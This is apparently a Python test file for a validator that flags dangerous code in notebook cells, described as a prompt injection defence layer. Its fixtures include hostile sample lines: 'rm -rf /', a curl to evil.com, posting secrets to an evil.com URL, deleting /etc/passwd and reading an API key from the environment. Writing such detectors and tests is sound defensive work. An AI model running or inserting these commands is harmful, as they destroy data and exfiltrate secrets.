"""Tests for notebook output safety validation (Layer 3 prompt injection defense)."""

import pytest

from output_validator import validate_notebook_safety


class TestSafeNotebooks:
    def test_clean_notebook_returns_no_warnings(self):
        cells = [
            {"cell_type": "markdown", "source": "# My Notebook"},
            {"cell_type": "code", "source": "import numpy as np\nx = np.array([1, 2, 3])"},
            {"cell_type": "code", "source": "import matplotlib.pyplot as plt\nplt.plot(x)"},
        ]
        warnings = validate_notebook_safety(cells)
        assert warnings == []

    def test_markdown_only_notebook_is_safe(self):
        cells = [
            {"cell_type": "markdown", "source": "# Title"},
            {"cell_type": "markdown", "source": "Some discussion text"},
        ]
        warnings = validate_notebook_safety(cells)
        assert warnings == []

    def test_standard_ml_imports_are_safe(self):
        cells = [
            {"cell_type": "code", "source": "import torch\nimport torch.nn as nn"},
            {"cell_type": "code", "source": "from sklearn.model_selection import train_test_split"},
            {"cell_type": "code", "source": "import pandas as pd\nimport scipy"},
        ]
        warnings = validate_notebook_safety(cells)
        assert warnings == []


class TestDangerousPatterns:
    def test_detects_os_system(self):
        cells = [{"cell_type": "code", "source": "import os\nos.system('rm -rf /')"}]
        warnings = validate_notebook_safety(cells)
        assert len(warnings) == 1
        assert warnings[0]["cell_index"] == 0
        assert "os.system" in warnings[0]["pattern"]

    def test_detects_subprocess(self):
        cells = [{"cell_type": "code", "source": "import subprocess\nsubprocess.run(['curl', 'evil.com'])"}]
        warnings = validate_notebook_safety(cells)
        assert len(warnings) >= 1
        assert any("subprocess" in w["pattern"] for w in warnings)

    def test_detects_eval(self):
        cells = [{"cell_type": "code", "source": "result = eval(user_input)"}]
        warnings = validate_notebook_safety(cells)
        assert len(warnings) >= 1
        assert any("eval(" in w["pattern"] for w in warnings)

    def test_detects_exec(self):
        cells = [{"cell_type": "code", "source": "exec('import os; os.remove(\"/etc/passwd\")')"}]
        warnings = validate_notebook_safety(cells)
        assert len(warnings) >= 1
        assert any("exec(" in w["pattern"] for w in warnings)

    def test_detects_dunder_import(self):
        cells = [{"cell_type": "code", "source": "mod = __import__('os')"}]
        warnings = validate_notebook_safety(cells)
        assert len(warnings) >= 1
        assert any("__import__" in w["pattern"] for w in warnings)

    def test_detects_file_write_operations(self):
        cells = [{"cell_type": "code", "source": "open('/etc/hosts', 'w').write('malicious')"}]
        warnings = validate_notebook_safety(cells)
        assert len(warnings) >= 1

    def test_detects_network_calls_with_requests(self):
        cells = [{"cell_type": "code", "source": "import requests\nrequests.post('http://evil.com/steal', data=secrets)"}]
        warnings = validate_notebook_safety(cells)
        assert len(warnings) >= 1

    def test_detects_os_environ_access(self):
        cells = [{"cell_type": "code", "source": "secret = os.environ['API_KEY']"}]
        warnings = validate_notebook_safety(cells)
        assert len(warnings) >= 1

    def test_detects_shutil_rmtree(self):
        cells = [{"cell_type": "code", "source": "import shutil\nshutil.rmtree('/important')"}]
        warnings = validate_notebook_safety(cells)
        assert len(warnings) >= 1


class TestMultipleCells:
    def test_reports_correct_cell_indices(self):
        cells = [
            {"cell_type": "markdown", "source": "# Safe markdown"},
            {"cell_type": "code", "source": "x = 1 + 1"},
            {"cell_type": "code", "source": "os.system('whoami')"},
            {"cell_type": "code", "source": "y = 2 + 2"},
            {"cell_type": "code", "source": "eval('bad_stuff')"},
        ]
        warnings = validate_notebook_safety(cells)
        indices = [w["cell_index"] for w in warnings]
        assert 2 in indices
        assert 4 in indices
        assert 1 not in indices

    def test_multiple_patterns_in_one_cell(self):
        cells = [{"cell_type": "code", "source": "import os\nos.system('ls')\neval('x')"}]
        warnings = validate_notebook_safety(cells)
        assert len(warnings) >= 2


class TestWarningStructure:
    def test_warning_has_required_fields(self):
        cells = [{"cell_type": "code", "source": "os.system('test')"}]
        warnings = validate_notebook_safety(cells)
        assert len(warnings) == 1
        w = warnings[0]
        assert "cell_index" in w
        assert "pattern" in w
        assert "message" in w

    def test_markdown_cells_are_skipped(self):
        cells = [{"cell_type": "markdown", "source": "os.system('this is just text about os.system')"}]
        warnings = validate_notebook_safety(cells)
        assert warnings == []


class TestEdgeCases:
    def test_empty_cells_list(self):
        assert validate_notebook_safety([]) == []

    def test_pip_install_is_safe(self):
        """pip install comments are common in notebooks and should not trigger."""
        cells = [{"cell_type": "code", "source": "# !pip install torch\n!pip install numpy"}]
        warnings = validate_notebook_safety(cells)
        assert warnings == []
